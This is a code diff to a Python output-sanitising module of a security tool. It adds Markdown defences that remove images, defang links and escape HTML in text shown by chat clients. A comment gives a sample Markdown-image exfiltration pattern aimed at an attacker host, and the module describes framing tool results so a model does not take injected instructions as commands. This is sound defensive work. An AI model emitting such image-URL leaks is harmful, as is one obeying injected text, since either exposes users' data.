@@ -2,14 +2,17 @@
 
 Attackers write text that ends up in Kratos: usernames in failed logins, URLs and
 user agents in web logs, process names, file names, cron lines, package descriptions.
-Two exits can carry it somewhere harmful, and both go through here (A.4):
+Three exits can carry it somewhere harmful, and all go through here (A.4, B.3):
 
 * the SCREEN (terminal, Textual, MCP text): escape sequences can hide, fake or overwrite
   what a person reads, and Rich markup in the text can restyle or link it
   -> `for_display` / `display_text` / `markup_safe`;
 * the MODEL: tool results reach it as plain text, so a line that reads like an
   instruction could be taken for one -> `for_model` / `envelope`, which frame the text as
-  data behind an unguessable boundary.
+  data behind an unguessable boundary;
+* a CHAT CLIENT that renders Markdown (kratos serve): an image is fetched the moment it is
+  shown, a link is clickable, raw HTML may render -> `md_code` / `md_block` /
+  `for_markdown`.
 
 What is stored (the events table keeps `event.original`, transcripts keep the tool's real
 result) is never changed: the stripping happens at the exits, so evidence stays evidence.
@@ -26,6 +29,7 @@ from typing import Any
 __all__ = [
     "ENVELOPE_RULE", "new_run_tag", "new_call_id", "frame_text", "for_display", "display_text", "markup_safe", "safe_print", "for_model", "envelope",
     "mixed_script", "mixed_script_marker", "annotate_lookalikes", "has_hidden_characters",
+    "md_code", "md_block", "for_markdown",
 ]
 
 # --- escape sequences -------------------------------------------------------------
@@ -294,3 +298,142 @@ def annotate_lookalikes(s: Any) -> str:
             out.append(marker)
     out.append(text[last:])
     return "".join(out)
+
+# --- Markdown (B.3): a chat client renders Markdown and fetches images ------------------
+# A chat client (Open WebUI, LibreChat, ...) renders a reply as Markdown: an image is
+# FETCHED the moment it is shown (`![x](https://attacker/?q=<data>)` leaks whatever the URL
+# carries without a click), a link or a bare URL becomes clickable, raw HTML may render.
+# Text from a machine -- or a model that read it -- can carry any of these. Three exits:
+#
+# * `md_code(s)`   -- machine text inline: one code span no content can close;
+# * `md_block(s)`  -- machine text as a block: a fence longer than any backtick run inside;
+# * `for_markdown(s, link_hosts=())` -- prose (the model's analysis): Markdown formatting
+#   kept, but every image removed, every link shown as text with its address defanged
+#   (`hxxps://evil\[.\]example/...`, never clickable, never fetched) unless its host is
+#   on `link_hosts`, raw HTML escaped, and the model's own code blocks re-fenced so
+#   nothing inside can close them early.
+_MD_FENCE_OPEN_RE = re.compile(r"^( {0,3})(`{3,}|~{3,})(.*)$")
+_MD_IMAGE_RE = re.compile(r"!\[([^\[\]\n]*)\]\(([^()\n]*(?:\([^()\n]*\)[^()\n]*)*)\)")
+_MD_LINK_RE = re.compile(r"\[([^\[\]\n]*)\]\(\s*<?([^()\s<>]*(?:\([^()\s]*\)[^()\s<>]*)*)>?(?:\s+(?:\"[^\"\n]*\"|'[^'\n]*'))?\s*\)")
+_MD_REF_DEF_RE = re.compile(r"^( {0,3})\[([^\]\n]+)\]:")
+_MD_URL_RE = re.compile(r"(?i)\b((?:https?|ftp|ftps|file|wss?|data|javascript|mailto):(?://)?[^\s<>`]+|www\.[^\s<>`]+)")
+_MD_EMAIL_RE = re.compile(r"(?i)\b([a-z0-9._%+-]+)@([a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,})\b")
+_MD_BACKTICK_RUN_RE = re.compile(r"`+")
+
+
+def _md_longest_backtick_run(text: str) -> int:
+    return max((len(m.group(0)) for m in _MD_BACKTICK_RUN_RE.finditer(text)), default=0)
+
+
+def md_code(s: Any, *, max_len: int | None = None) -> str:
+    """Machine text as one inline code span: cleaned, on one line, behind a backtick fence
+    longer than any run inside, so nothing in it renders -- no image, no link, no HTML."""
+    text = for_display(s, max_len=max_len).replace("\r", " ").replace("\n", " ").strip()
+    if not text:
+        return ""
+    fence = "`" * (_md_longest_backtick_run(text) + 1)
+    return f"{fence} {text} {fence}"
+
+
+def md_block(s: Any, *, info: str = "text") -> str:
+    """Machine text as a fenced code block whose fence no line inside can match."""
+    text = for_display(s).replace("\r\n", "\n").replace("\r", "\n").rstrip("\n")
+    fence = "`" * max(3, _md_longest_backtick_run(text) + 1)
+    info = re.sub(r"[^a-z0-9_+-]", "", str(info or "").lower())[:20]
+    return f"{fence}{info}\n{text}\n{fence}"
+
+
+def _md_host(url: str) -> str:
+    from urllib.parse import urlparse
+
+    u = url if "://" in url else "//" + url
+    try:
+        return (urlparse(u).hostname or "").lower()
+    except ValueError:
+        return ""
+
+
+def _md_defang(url: str) -> str:
+    """`https://evil.example/x` -> `hxxps://evil\\[.\\]example/x`: readable, copyable by a
+    person who means it, and no Markdown renderer turns it into a link or fetches it."""
+    out = re.sub(r"(?i)^(h)tt(ps?)", r"\1xx\2", url)
+    out = re.sub(r"(?i)^(ftps?|file|wss?|data|javascript|mailto):", lambda m: m.group(1) + "[:]", out)
+    out = out.replace("://", "[:]//") if out.lower().startswith(("hxxp", "ftp")) else out
+    out = re.sub(r"(?<=[A-Za-z0-9])\.(?=[A-Za-z0-9])", r"\\[.\\]", out, count=0)
+    return out.replace("[:]", "\\[:\\]")
+
+
+def _md_inline(line: str, link_hosts: frozenset[str]) -> str:
+    """One prose line outside a code block, made inert."""
+    def image(m: "re.Match[str]") -> str:
+        alt = m.group(1).strip()
+        return f"(image removed{': ' + alt if alt else ''})"
+
+    keep: list[str] = []
+
+    def stash(text: str) -> str:
+        keep.append(text)
+        return f"\x00{len(keep) - 1}\x00"
+
+    def link(m: "re.Match[str]") -> str:
+        label, url = m.group(1), m.group(2)
+        if url and _md_host(url) in link_hosts and url.lower().startswith(("https://", "http://")):
+            clean = _MD_URL_RE.sub(lambda u: _md_defang(u.group(1)), label).replace("<", "&lt;")
+            return stash(f"[{clean}]({url})")
+        shown = _md_defang(url) if url else ""
+        return f"{label} ({shown})" if shown else label
+
+    def url(m: "re.Match[str]") -> str:
+        raw = m.group(1)
+        if _md_host(raw) in link_hosts and raw.lower().startswith(("https://", "http://")):
+            return stash(raw)
+        return _md_defang(raw)
+
+    def email(m: "re.Match[str]") -> str:
+        return f"{m.group(1)}\\[at\\]{m.group(2)}"
+
+    line = _MD_IMAGE_RE.sub(image, line)
+    line = line.replace("![", "!\\[")                 # an image form the pattern above missed
+    line = _MD_LINK_RE.sub(link, line)
+    line = _MD_REF_DEF_RE.sub(lambda m: m.group(1) + "\\[" + m.group(2) + "\\]:", line)
+    line = line.replace("](", "\\](")                 # any link form the pattern above missed
+    line = _MD_URL_RE.sub(url, line)
+    line = _MD_EMAIL_RE.sub(email, line)
+    line = line.replace("<", "&lt;")                  # raw HTML and <autolinks>
+    return re.sub(r"\x00(\d+)\x00", lambda m: keep[int(m.group(1))], line)
+
+
+def for_markdown(s: Any, *, link_hosts: Any = ()) -> str:
+    """Prose -- the model's analysis, a chat reply -- for a client that renders Markdown.
+
+    Formatting (paragraphs, lists, emphasis, headings, code) is kept. What a renderer
+    would fetch or let a person click is not: images are removed (`(image removed: alt)`),
+    links become `label (hxxps://host\\[.\\]tld/...)` and bare addresses are defanged the
+    same way, unless the host is on `link_hosts` (`serve.link_hosts`, empty by default);
+    raw HTML is escaped; each code block is re-fenced with a fence no line inside can
+    close, so text after it can't hide in what a renderer thinks is still code (or the
+    reverse). Cleaned with `for_display` first. Idempotent enough for a second pass to be
+    harmless; never raises."""
+    hosts = frozenset(str(h).strip().lower() for h in (link_hosts or ()) if str(h).strip())
+    text = for_display(s).replace("\r\n", "\n").replace("\r", "\n")
+    out: list[str] = []
+    lines = text.split("\n")
+    i = 0
+    while i < len(lines):
+        m = _MD_FENCE_OPEN_RE.match(lines[i])
+        if m and not (m.group(2)[0] == "`" and "`" in m.group(3)):
+            char, length = m.group(2)[0], len(m.group(2))
+            body: list[str] = []
+            j = i + 1
+            while j < len(lines):
+                close = re.match(r"^ {0,3}(" + re.escape(char) + r"{" + str(length) + r",})\s*$", lines[j])
+                if close:
+                    break
+                body.append(lines[j])
+                j += 1
+            out.append(md_block("\n".join(body), info=m.group(3).strip().split(" ")[0] if m.group(3) else ""))
+            i = j + 1
+            continue
+        out.append(_md_inline(lines[i], hosts))
+        i += 1
+    return "\n".join(out)
